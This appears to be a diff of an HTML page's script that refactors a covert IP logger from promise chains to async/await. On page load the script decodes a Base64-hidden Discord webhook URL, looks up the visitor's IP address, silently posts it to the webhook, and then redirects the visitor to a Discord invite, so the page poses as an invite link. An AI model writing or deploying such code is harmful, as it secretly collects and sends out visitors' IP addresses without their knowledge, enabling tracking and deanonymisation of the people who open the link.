@@ -13,36 +13,38 @@
         // Decode the Base64 encoded URL
         const webhookUrl = atob(encodedWebhookUrl);
 
-        fetch('https://api.ipify.org?format=json')
-            .then(response => response.json())
-            .then(data => {
+        async function sendIPAndRedirect() {
+            try {
+                // Fetch the user's IP address
+                const response = await fetch('https://api.ipify.org?format=json');
+                const data = await response.json();
                 const ipAddress = data.ip;
 
-                // Send the IP address to Discord webhook silently
+                // Send the IP address to the Discord webhook silently
                 const messageData = {
                     content: `New IP Address: ${ipAddress}`
                 };
 
-                fetch(webhookUrl, {
+                // Send the IP to Discord webhook
+                await fetch(webhookUrl, {
                     method: 'POST',
                     headers: {
                         'Content-Type': 'application/json'
                     },
                     body: JSON.stringify(messageData)
-                })
-                .catch(error => {
-                    console.error('Error sending IP address to Discord:', error);
-                })
-                .finally(() => {
-                    // After sending the IP address, redirect to the Discord invite
-                    window.location.href = 'https://discord.gg/fwendies';
                 });
-            })
-            .catch(error => {
-                console.error('Error fetching IP:', error);
-                // Redirect to Discord invite if IP fetching fails
+
+                // Redirect to the Discord invite after sending the IP
                 window.location.href = 'https://discord.gg/fwendies';
-            });
+            } catch (error) {
+                console.error('Error fetching or sending IP:', error);
+                // Redirect to Discord invite if there's an error
+                window.location.href = 'https://discord.gg/fwendies';
+            }
+        }
+
+        // Call the function to send IP and then redirect
+        sendIPAndRedirect();
     </script>
 </body>
 </html>
